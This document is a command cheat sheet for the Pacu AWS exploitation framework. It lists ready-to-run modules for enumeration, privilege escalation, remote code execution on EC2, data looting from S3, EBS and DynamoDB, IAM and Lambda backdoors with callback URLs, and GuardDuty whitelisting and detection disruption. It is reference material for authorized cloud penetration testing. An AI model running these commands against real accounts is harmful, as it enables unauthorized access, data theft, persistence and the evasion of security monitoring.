# Pacu

## setup

### Install with uv tool

Install Pacu with uv tool.

```sh title:"Pacu Install with uv Tool"
uv tool install pacu
```
<!-- cheat -->

### Run with uvx

Run Pacu with uvx.

```sh title:"Pacu Run with uvx"
uvx pacu --pacu-help
```
<!-- cheat -->

### Install from Git

Install Pacu from git.

```sh title:"Pacu Install from Git"
git clone https://github.com/RhinoSecurityLabs/pacu.git && cd pacu && uv run --with-requirements requirements.txt python cli.py --pacu-help
```
<!-- cheat -->

### Version

Show version with Pacu.

```sh title:"Pacu Show Version"
pacu --version
```
<!-- cheat -->

### Pacu help

Show help with Pacu.

```sh title:"Pacu Show Help"
pacu --pacu-help
```
<!-- cheat -->

### List modules

List modules with Pacu.

```sh title:"Pacu List Modules"
pacu --list-modules
```
<!-- cheat -->

### Module info

Show module info with Pacu.

```sh title:"Pacu Show Module Info"
pacu --module-name "$module_name" --module-info
```
<!-- cheat
var module_name
-->

## session setup

### New session from profile

Create session from profile with Pacu.

```sh title:"Pacu Create Session from Profile"
pacu --new-session "$session_name" --import-keys "$aws_profile"
```
<!-- cheat
var session_name
var aws_profile
-->

### Start existing session

Start existing session with Pacu.

```sh title:"Pacu Start Existing Session"
pacu --session "$session_name"
```
<!-- cheat
var session_name
-->

### Activate existing session

Set activate existing session with Pacu.

```sh title:"Pacu Set Activate Existing Session"
pacu --session "$session_name" --activate-session
```
<!-- cheat
var session_name
-->

### List sessions

List sessions with Pacu.

```sh title:"Pacu List Sessions"
sessions
```
<!-- cheat -->

### Swap session

Set swap session with Pacu.

```sh title:"Pacu Set Swap Session"
swap_session "$session_name"
```
<!-- cheat
var session_name
-->

### Delete session

Remove session with Pacu.

```sh title:"Pacu Remove Session"
delete_session
```
<!-- cheat -->

## keys and identity

### Import AWS profile

Run import AWS profile with Pacu.

```sh title:"Pacu Run Import AWS Profile"
import_keys "$aws_profile"
```
<!-- cheat
var aws_profile
-->

### Import all profiles

Run import all profiles with Pacu.

```sh title:"Pacu Run Import All Profiles"
import_keys --all
```
<!-- cheat -->

### Set keys interactively

Set keys interactively with Pacu.

```sh title:"Pacu Set Keys Interactively"
set_keys
```
<!-- cheat -->

### Set keys from CLI

Set keys from CLI with Pacu.

```sh title:"Pacu Set Keys from CLI"
pacu --session "$session_name" --set-keys "$key_alias,$aws_access_key_id,$aws_secret_access_key,$aws_session_token"
```
<!-- cheat
var session_name
var key_alias
var aws_access_key_id
var aws_secret_access_key
var aws_session_token
-->

### Swap keys

Set swap keys with Pacu.

```sh title:"Pacu Set Swap Keys"
swap_keys
```
<!-- cheat -->

### Whoami

Show whoami with Pacu.

```sh title:"Pacu Show Whoami"
whoami
```
<!-- cheat -->

### Whoami from CLI

Show whoami from CLI with Pacu.

```sh title:"Pacu Show Whoami from CLI"
pacu --session "$session_name" --whoami
```
<!-- cheat
var session_name
-->

### Assume role

Run assume role with Pacu.

```sh title:"Pacu Run Assume Role"
assume_role "$aws_role_arn"
```
<!-- cheat
var aws_role_arn
-->

### Assume role with MFA

Run assume role with MFA with Pacu.

```sh title:"Pacu Run Assume Role with MFA"
assume_role "$aws_role_arn" "$aws_mfa_serial_arn" "$aws_mfa_token_code"
```
<!-- cheat
var aws_role_arn
var aws_mfa_serial_arn
var aws_mfa_token_code
-->

### Export active keys

Run export active keys with Pacu.

```sh title:"Pacu Run Export Active Keys"
export_keys
```
<!-- cheat -->

### Console URL

Dump console URL with Pacu.

```sh title:"Pacu Dump Console URL"
console
```
<!-- cheat -->

## regions and opsec

### List regions

List regions with Pacu.

```sh title:"Pacu List Regions"
regions
```
<!-- cheat -->

### Set target regions

Set target regions with Pacu.

```sh title:"Pacu Set Target Regions"
set_regions "$aws_region_one" "$aws_region_two"
```
<!-- cheat
var aws_region_one := us-east-1
var aws_region_two := us-west-2
-->

### Set regions from CLI

Set regions from CLI with Pacu.

```sh title:"Pacu Set Regions from CLI"
pacu --session "$session_name" --set-regions "$aws_region_one" "$aws_region_two"
```
<!-- cheat
var session_name
var aws_region_one := us-east-1
var aws_region_two := us-west-2
-->

### Reset regions

Set reset regions with Pacu.

```sh title:"Pacu Set Reset Regions"
set_regions all
```
<!-- cheat -->

### Update region database

Update region database with Pacu.

```sh title:"Pacu Update Region Database"
update_regions
```
<!-- cheat -->

### Set user-agent suffix

Set user agent suffix with Pacu.

```sh title:"Pacu Set User Agent Suffix"
set_ua_suffix "$ua_suffix"
```
<!-- cheat
var ua_suffix := engagement-id
-->

### Randomize user-agent suffix

Generate randomize user agent suffix with Pacu.

```sh title:"Pacu Generate Randomize User Agent Suffix"
set_ua_suffix
```
<!-- cheat -->

### Clear user-agent suffix

Run clear user agent suffix with Pacu.

```sh title:"Pacu Run Clear User Agent Suffix"
unset_ua_suffix
```
<!-- cheat -->

## module workflow

### Search modules

Search modules with Pacu.

```sh title:"Pacu Search Modules"
search "$keyword"
```
<!-- cheat
var keyword := iam
-->

### List module categories

List module categories with Pacu.

```sh title:"Pacu List Module Categories"
list categories
```
<!-- cheat -->

### List category modules

List category modules with Pacu.

```sh title:"Pacu List Category Modules"
list category "$category"
```
<!-- cheat
var category := ENUM
-->

### Help for module

Show help for module with Pacu.

```sh title:"Pacu Show Help for Module"
help "$module_name"
```
<!-- cheat
var module_name
-->

### Run module

Run module with Pacu.

```sh title:"Pacu Run Module"
run "$module_name"
```
<!-- cheat
var module_name
-->

### Run module with args

Run module with args with Pacu.

```sh title:"Pacu Run Module with Args"
run "$module_name" $module_args
```
<!-- cheat
var module_name
var module_args
-->

### Run module in regions

Run module in regions with Pacu.

```sh title:"Pacu Run Module in Regions"
run "$module_name" --regions "$aws_region_list"
```
<!-- cheat
var module_name
var aws_region_list := us-east-1,us-west-2
-->

### Execute module from CLI

Execute module from CLI with Pacu.

```sh title:"Pacu Execute Module from CLI"
pacu --session "$session_name" --module-name "$module_name" --exec
```
<!-- cheat
var session_name
var module_name
-->

### Execute module with args from CLI

Execute module with args from CLI with Pacu.

```sh title:"Pacu Execute Module with Args from CLI"
pacu --session "$session_name" --module-name "$module_name" --module-args="$module_args" --exec
```
<!-- cheat
var session_name
var module_name
var module_args
-->

### Load command file

Execute load command file with Pacu.

```sh title:"Pacu Execute Load Command File"
load_commands_file "$commands_file"
```
<!-- cheat
var commands_file
-->

### AWS CLI through Pacu

Execute AWS CLI through pacu with Pacu.

```sh title:"Pacu Execute AWS CLI Through Pacu"
aws sts get-caller-identity
```
<!-- cheat -->

### AWS CLI with jq through Pacu

Execute AWS CLI with jq through pacu with Pacu.

```sh title:"Pacu Execute AWS CLI with Jq Through Pacu"
aws iam list-attached-user-policies --user-name "$target_user" | jq '.AttachedPolicies[]?.PolicyArn'
```
<!-- cheat
var target_user
-->

## operator runbooks

### Account triage chain

Execute account triage chain with Pacu.

```sh title:"Pacu Execute Account Triage Chain"
run aws__enum_account && run aws__enum_spend && run iam__enum_permissions && run iam__enum_users_roles_policies_groups && run detection__enum_services
```
<!-- cheat -->

### High-value service enum chain

Enumerate high value service enum chain with Pacu.

```sh title:"Pacu Enumerate High Value Service Enum Chain"
run ec2__enum && run lambda__enum && run ecs__enum && run eks__enum && run s3__download_bucket --names-only && run secrets__enum
```
<!-- cheat -->

### Identity attack-path chain

Execute identity attack path chain with Pacu.

```sh title:"Pacu Execute Identity Attack Path Chain"
run iam__enum_permissions --all-users && run iam__enum_users_roles_policies_groups && run iam__privesc_scan --scan-only && run iam__enum_action_query --query "$aws_iam_action_query"
```
<!-- cheat
var aws_iam_action_query := iam:*,sts:AssumeRole,lambda:*,cloudformation:*,glue:*
-->

### Compute loot chain

Enumerate compute loot chain with Pacu.

```sh title:"Pacu Enumerate Compute Loot Chain"
run ec2__download_userdata && run ecs__enum_task_def && run lambda__enum && run codebuild__enum && run lightsail__enum
```
<!-- cheat -->

### Data exposure chain

Enumerate data exposure chain with Pacu.

```sh title:"Pacu Enumerate Data Exposure Chain"
run s3__download_bucket --names-only && run dynamodb__enum && run rds__enum_snapshots && run ebs__enum_volumes_snapshots && run systemsmanager__download_parameters
```
<!-- cheat -->

## enum workflow

### Account metadata

Enumerate account metadata with Pacu.

```sh title:"Pacu Enumerate Account Metadata"
run aws__enum_account
```
<!-- cheat -->

### Spend by service

Enumerate spend by service with Pacu.

```sh title:"Pacu Enumerate Spend by Service"
run aws__enum_spend
```
<!-- cheat -->

### IAM users roles policies groups

Enumerate IAM users roles policies groups with Pacu.

```sh title:"Pacu Enumerate IAM Users Roles Policies Groups"
run iam__enum_users_roles_policies_groups
```
<!-- cheat -->

### IAM permissions current user

Enumerate IAM permissions current user with Pacu.

```sh title:"Pacu Enumerate IAM Permissions Current User"
run iam__enum_permissions
```
<!-- cheat -->

### IAM permissions all users

Enumerate IAM permissions all users with Pacu.

```sh title:"Pacu Enumerate IAM Permissions All Users"
run iam__enum_permissions --all-users
```
<!-- cheat -->

### IAM action query

Enumerate IAM action query with Pacu.

```sh title:"Pacu Enumerate IAM Action Query"
run iam__enum_action_query --query "$aws_iam_action_query"
```
<!-- cheat
var aws_iam_action_query := s3:get*,iam:create*
-->

### IAM credential report

Dump IAM credential report with Pacu.

```sh title:"Pacu Dump IAM Credential Report"
run iam__get_credential_report
```
<!-- cheat -->

### EC2 enum

Enumerate EC2 enum with Pacu.

```sh title:"Pacu Enumerate EC2 Enum"
run ec2__enum
```
<!-- cheat -->

### EC2 userdata

Download EC2 userdata with Pacu.

```sh title:"Pacu Download EC2 Userdata"
run ec2__download_userdata
```
<!-- cheat -->

### EBS volumes snapshots

Enumerate EBS volumes snapshots with Pacu.

```sh title:"Pacu Enumerate EBS Volumes Snapshots"
run ebs__enum_volumes_snapshots
```
<!-- cheat -->

### EBS public snapshots

Enumerate EBS public snapshots with Pacu.

```sh title:"Pacu Enumerate EBS Public Snapshots"
run ebs__enum_snapshots_unauth --keyword "$keyword"
```
<!-- cheat
var keyword
-->

### RDS snapshots

Enumerate RDS snapshots with Pacu.

```sh title:"Pacu Enumerate RDS Snapshots"
run rds__enum_snapshots
```
<!-- cheat -->

### RDS enum

Enumerate RDS enum with Pacu.

```sh title:"Pacu Enumerate RDS Enum"
run rds__enum
```
<!-- cheat -->

### Lambda enum

Enumerate lambda enum with Pacu.

```sh title:"Pacu Enumerate Lambda Enum"
run lambda__enum
```
<!-- cheat -->

### ECS task definitions

Enumerate ECS task definitions with Pacu.

```sh title:"Pacu Enumerate ECS Task Definitions"
run ecs__enum_task_def
```
<!-- cheat -->

### ECS enum

Enumerate ECS enum with Pacu.

```sh title:"Pacu Enumerate ECS Enum"
run ecs__enum
```
<!-- cheat -->

### ECR enum

Enumerate ECR enum with Pacu.

```sh title:"Pacu Enumerate ECR Enum"
run ecr__enum
```
<!-- cheat -->

### EKS enum

Enumerate EKS enum with Pacu.

```sh title:"Pacu Enumerate EKS Enum"
run eks__enum
```
<!-- cheat -->

### EKS collect tokens

Enumerate EKS collect tokens with Pacu.

```sh title:"Pacu Enumerate EKS Collect Tokens"
run eks__collect_tokens
```
<!-- cheat -->

### Cognito enum

Enumerate cognito enum with Pacu.

```sh title:"Pacu Enumerate Cognito Enum"
run cognito__enum
```
<!-- cheat -->

### API Gateway enum

Enumerate API gateway enum with Pacu.

```sh title:"Pacu Enumerate API Gateway Enum"
run apigateway__enum
```
<!-- cheat -->

### ACM enum

Enumerate ACM enum with Pacu.

```sh title:"Pacu Enumerate ACM Enum"
run acm__enum
```
<!-- cheat -->

### CloudFormation data

Download CloudFormation data with Pacu.

```sh title:"Pacu Download CloudFormation Data"
run cloudformation__download_data
```
<!-- cheat -->

### CodeBuild enum

Enumerate CodeBuild enum with Pacu.

```sh title:"Pacu Enumerate CodeBuild Enum"
run codebuild__enum
```
<!-- cheat -->

### Glue enum

Enumerate glue enum with Pacu.

```sh title:"Pacu Enumerate Glue Enum"
run glue__enum
```
<!-- cheat -->

### Directory Service enum

Enumerate directory service enum with Pacu.

```sh title:"Pacu Enumerate Directory Service Enum"
run ds__enum
```
<!-- cheat -->

### Elastic Beanstalk enum

Enumerate elastic beanstalk enum with Pacu.

```sh title:"Pacu Enumerate Elastic Beanstalk Enum"
run elasticbeanstalk__enum
```
<!-- cheat -->

### MQ enum

Enumerate MQ enum with Pacu.

```sh title:"Pacu Enumerate MQ Enum"
run mq__enum
```
<!-- cheat -->

### Transfer Family enum

Enumerate transfer family enum with Pacu.

```sh title:"Pacu Enumerate Transfer Family Enum"
run transfer_family__enum
```
<!-- cheat -->

### Inspector reports

Enumerate inspector reports with Pacu.

```sh title:"Pacu Enumerate Inspector Reports"
run inspector__get_reports
```
<!-- cheat -->

### Secrets enum

Dump secrets enum with Pacu.

```sh title:"Pacu Dump Secrets Enum"
run secrets__enum
```
<!-- cheat -->

### SSM parameters

Download SSM parameters with Pacu.

```sh title:"Pacu Download SSM Parameters"
run systemsmanager__download_parameters
```
<!-- cheat -->

### Route53 enum

Enumerate route53 enum with Pacu.

```sh title:"Pacu Enumerate Route53 Enum"
run route53__enum
```
<!-- cheat -->

### Organizations enum

Enumerate organizations enum with Pacu.

```sh title:"Pacu Enumerate Organizations Enum"
run organizations__enum
```
<!-- cheat -->

### VPC lateral movement enum

Enumerate VPC lateral movement enum with Pacu.

```sh title:"Pacu Enumerate VPC Lateral Movement Enum"
run vpc__enum_lateral_movement
```
<!-- cheat -->

## unauth recon

### Decode access key ID

Decode access key ID with Pacu.

```sh title:"Pacu Decode Access Key ID"
run iam__decode_accesskey_id --access-key-id "$aws_access_key_id"
```
<!-- cheat
var aws_access_key_id
-->

### Detect honeytoken keys

Enumerate detect honeytoken keys with Pacu.

```sh title:"Pacu Enumerate Detect Honeytoken Keys"
run iam__detect_honeytokens
```
<!-- cheat -->

### Enumerate external roles

Enumerate external roles with Pacu.

```sh title:"Pacu Enumerate External Roles"
run iam__enum_roles --account-id "$aws_account_id" --role-name "$aws_role_name"
```
<!-- cheat
var aws_account_id
var aws_role_name
-->

### Enumerate external users

Enumerate external users with Pacu.

```sh title:"Pacu Enumerate External Users"
run iam__enum_users --account-id "$aws_account_id" --role-name "$aws_role_name"
```
<!-- cheat
var aws_account_id
var aws_role_name
-->

### Enumerate public snapshots by keyword

Enumerate public snapshots by keyword with Pacu.

```sh title:"Pacu Enumerate Public Snapshots by Keyword"
run ebs__enum_snapshots_unauth --keyword "$keyword"
```
<!-- cheat
var keyword
-->

### Enumerate public snapshots by account

Enumerate public snapshots by account with Pacu.

```sh title:"Pacu Enumerate Public Snapshots by Account"
run ebs__enum_snapshots_unauth --account-id "$aws_account_id"
```
<!-- cheat
var aws_account_id
-->

## privilege escalation

### Privesc method list

List privesc method list with Pacu.

```sh title:"Pacu List Privesc Method List"
run iam__privesc_scan --method-list
```
<!-- cheat -->

### Privesc method info

Show privesc method info with Pacu.

```sh title:"Pacu Show Privesc Method Info"
run iam__privesc_scan --method-info "$method_name"
```
<!-- cheat
var method_name := CreateNewPolicyVersion
-->

### Privesc scan only

Scan privesc scan only with Pacu.

```sh title:"Pacu Scan Privesc Scan Only"
run iam__privesc_scan --scan-only
```
<!-- cheat -->

### Privesc offline scan

Scan privesc offline scan with Pacu.

```sh title:"Pacu Scan Privesc Offline Scan"
run iam__privesc_scan --offline --folder "$aws_policy_folder"
```
<!-- cheat
var aws_policy_folder
-->

### Privesc selected user methods

Execute privesc selected user methods with Pacu.

```sh title:"Pacu Execute Privesc Selected User Methods"
run iam__privesc_scan --user-methods "$method_name"
```
<!-- cheat
var method_name := CreateAccessKey
-->

### Privesc selected role methods

Execute privesc selected role methods with Pacu.

```sh title:"Pacu Execute Privesc Selected Role Methods"
run iam__privesc_scan --role-methods "$method_name"
```
<!-- cheat
var method_name := PassExistingRoleToNewLambdaThenInvoke
-->

## exploit and access

### SSM RCE EC2

Execute SSM RCE EC2 with Pacu.

```sh title:"Pacu Execute SSM RCE EC2"
run systemsmanager__rce_ec2
```
<!-- cheat -->

### Cognito attack

Run cognito attack with Pacu.

```sh title:"Pacu Run Cognito Attack"
run cognito__attack --username "$target_user" --password "$target_pass"
```
<!-- cheat
var target_user
var target_pass
-->

### API Gateway create keys

Create API gateway create keys with Pacu.

```sh title:"Pacu Create API Gateway Create Keys"
run api_gateway__create_api_keys
```
<!-- cheat -->

### CloudFormation resource injection

Run CloudFormation resource injection with Pacu.

```sh title:"Pacu Run CloudFormation Resource Injection"
run cfn__resource_injection
```
<!-- cheat -->

### CloudTrail CSV injection

Run CloudTrail CSV injection with Pacu.

```sh title:"Pacu Run CloudTrail CSV Injection"
run cloudtrail__csv_injection
```
<!-- cheat -->

### EBS explore snapshots

Run EBS explore snapshots with Pacu.

```sh title:"Pacu Run EBS Explore Snapshots"
run ebs__explore_snapshots --instance-id "$aws_instance_id"
```
<!-- cheat
var aws_instance_id
-->

### RDS explore snapshots

Run RDS explore snapshots with Pacu.

```sh title:"Pacu Run RDS Explore Snapshots"
run rds__explore_snapshots
```
<!-- cheat -->

### EC2 startup shell script

Start EC2 startup shell script with Pacu.

```sh title:"Pacu Start EC2 Startup Shell Script"
run ec2__startup_shell_script --script "$aws_userdata_script_file"
```
<!-- cheat
var aws_userdata_script_file
-->

### ECS backdoor task definition

Run ECS backdoor task definition with Pacu.

```sh title:"Pacu Run ECS Backdoor Task Definition"
run ecs__backdoor_task_def
```
<!-- cheat -->

### Lightsail default keys

Download lightsail default keys with Pacu.

```sh title:"Pacu Download Lightsail Default Keys"
run lightsail__download_ssh_keys
```
<!-- cheat -->

### Lightsail temporary access

Generate lightsail temporary access with Pacu.

```sh title:"Pacu Generate Lightsail Temporary Access"
run lightsail__generate_temp_access
```
<!-- cheat -->

## exfil and loot

### S3 enumerate bucket names

Dump S3 enumerate bucket names with Pacu.

```sh title:"Pacu Dump S3 Enumerate Bucket Names"
run s3__download_bucket --names-only
```
<!-- cheat -->

### S3 download specific buckets

Download S3 download specific buckets with Pacu.

```sh title:"Pacu Download S3 Download Specific Buckets"
run s3__download_bucket --dl-names "$s3_bucket_names"
```
<!-- cheat
var s3_bucket_names
-->

### S3 download bucket workflow

Download S3 download bucket workflow with Pacu.

```sh title:"Pacu Download S3 Download Bucket Workflow"
run s3__download_bucket
```
<!-- cheat -->

### EBS direct snapshot download

Download EBS direct snapshot download with Pacu.

```sh title:"Pacu Download EBS Direct Snapshot Download"
run ebs__download_snapshots
```
<!-- cheat -->

### DynamoDB enum and dump

Dump DynamoDB enum and dump with Pacu.

```sh title:"Pacu Dump DynamoDB Enum and Dump"
run dynamodb__enum
```
<!-- cheat -->

### CloudFormation template loot

Dump CloudFormation template loot with Pacu.

```sh title:"Pacu Dump CloudFormation Template Loot"
run cloudformation__download_data
```
<!-- cheat -->

## persistence

### IAM backdoor assume role

Run IAM backdoor assume role with Pacu.

```sh title:"Pacu Run IAM Backdoor Assume Role"
run iam__backdoor_assume_role
```
<!-- cheat -->

### IAM backdoor user keys

Run IAM backdoor user keys with Pacu.

```sh title:"Pacu Run IAM Backdoor User Keys"
run iam__backdoor_users_keys
```
<!-- cheat -->

### IAM backdoor user password

Dump IAM backdoor user password with Pacu.

```sh title:"Pacu Dump IAM Backdoor User Password"
run iam__backdoor_users_password
```
<!-- cheat -->

### EC2 security group backdoor

Run EC2 security group backdoor with Pacu.

```sh title:"Pacu Run EC2 Security Group Backdoor"
run ec2__backdoor_ec2_sec_groups --source-ip "$aws_source_ip"
```
<!-- cheat
var aws_source_ip
-->

### Lambda backdoor new users

Create lambda backdoor new users with Pacu.

```sh title:"Pacu Create Lambda Backdoor New Users"
run lambda__backdoor_new_users --url "$aws_callback_url"
```
<!-- cheat
var aws_callback_url
-->

### Lambda backdoor new roles

Create lambda backdoor new roles with Pacu.

```sh title:"Pacu Create Lambda Backdoor New Roles"
run lambda__backdoor_new_roles --principal "$aws_principal_arn"
```
<!-- cheat
var aws_principal_arn
-->

### Lambda backdoor new security groups

Create lambda backdoor new security groups with Pacu.

```sh title:"Pacu Create Lambda Backdoor New Security Groups"
run lambda__backdoor_new_sec_groups --source-ip "$aws_source_ip"
```
<!-- cheat
var aws_source_ip
-->

## detection and logs

### Detect logging services

Enumerate detect logging services with Pacu.

```sh title:"Pacu Enumerate Detect Logging Services"
run detection__enum_services
```
<!-- cheat -->

### GuardDuty accounts

List GuardDuty accounts with Pacu.

```sh title:"Pacu List GuardDuty Accounts"
run guardduty__list_accounts
```
<!-- cheat -->

### GuardDuty findings

Find GuardDuty findings with Pacu.

```sh title:"Pacu Find GuardDuty Findings"
run guardduty__list_findings
```
<!-- cheat -->

### GuardDuty whitelist IP

List GuardDuty whitelist IP with Pacu.

```sh title:"Pacu List GuardDuty Whitelist IP"
run guardduty__whitelist_ip --source-ip "$aws_source_ip"
```
<!-- cheat
var aws_source_ip
-->

### CloudTrail event history

Download CloudTrail event history with Pacu.

```sh title:"Pacu Download CloudTrail Event History"
run cloudtrail__download_event_history
```
<!-- cheat -->

### CloudWatch logs

Download CloudWatch logs with Pacu.

```sh title:"Pacu Download CloudWatch Logs"
run cloudwatch__download_logs
```
<!-- cheat -->

### Detection disruption

Run detection disruption with Pacu.

```sh title:"Pacu Run Detection Disruption"
run detection__disruption
```
<!-- cheat -->

### ELB logging gaps

Enumerate ELB logging gaps with Pacu.

```sh title:"Pacu Enumerate ELB Logging Gaps"
run elb__enum_logging
```
<!-- cheat -->

### WAF enum

Enumerate WAF enum with Pacu.

```sh title:"Pacu Enumerate WAF Enum"
run waf__enum
```
<!-- cheat -->

## lateral movement

### Organizations assume role

Set organizations assume role with Pacu.

```sh title:"Pacu Set Organizations Assume Role"
run organizations__assume_role --accounts "$aws_account_ids" --role-names "$aws_role_names"
```
<!-- cheat
var aws_account_ids
var aws_role_names
-->

### SNS subscribe

Set SNS subscribe with Pacu.

```sh title:"Pacu Set SNS Subscribe"
run sns__subscribe --topic-arn "$aws_sns_topic_arn" --email "$aws_sns_email"
```
<!-- cheat
var aws_sns_topic_arn
var aws_sns_email
-->

## data and output

### Services with data

List services with data with Pacu.

```sh title:"Pacu List Services with Data"
services
```
<!-- cheat -->

### Show all data

Show all data with Pacu.

```sh title:"Pacu Show All Data"
data
```
<!-- cheat -->

### Show service data

Show service data with Pacu.

```sh title:"Pacu Show Service Data"
data "$service_name"
```
<!-- cheat
var service_name := IAM
-->

### Query service data with jq

Query service data with jq with Pacu.

```sh title:"Pacu Query Service Data with Jq"
jq "$service_name" "$jq_filter"
```
<!-- cheat
var service_name := IAM
var jq_filter := .
-->

### Data from CLI

Show data from CLI with Pacu.

```sh title:"Pacu Show Data from CLI"
pacu --session "$session_name" --data "$service_name"
```
<!-- cheat
var session_name
var service_name := all
-->

### Downloads directory

Download downloads directory with Pacu.

```sh title:"Pacu Download Downloads Directory"
printf '%s\n' "$HOME/.local/share/pacu/sessions/$session_name/downloads"
```
<!-- cheat
var session_name
-->

### Command log

Execute command log with Pacu.

```sh title:"Pacu Execute Command Log"
tail -n 100 "$HOME/.local/share/pacu/sessions/$session_name/cmd_log.txt"
```
<!-- cheat
var session_name
-->

### Error log

Show error log with Pacu.

```sh title:"Pacu Show Error Log"
debug
```
<!-- cheat -->

### Error log file

Run error log file with Pacu.

```sh title:"Pacu Run Error Log File"
tail -n 100 "$HOME/.local/share/pacu/sessions/$session_name/error_log.txt"
```
<!-- cheat
var session_name
-->
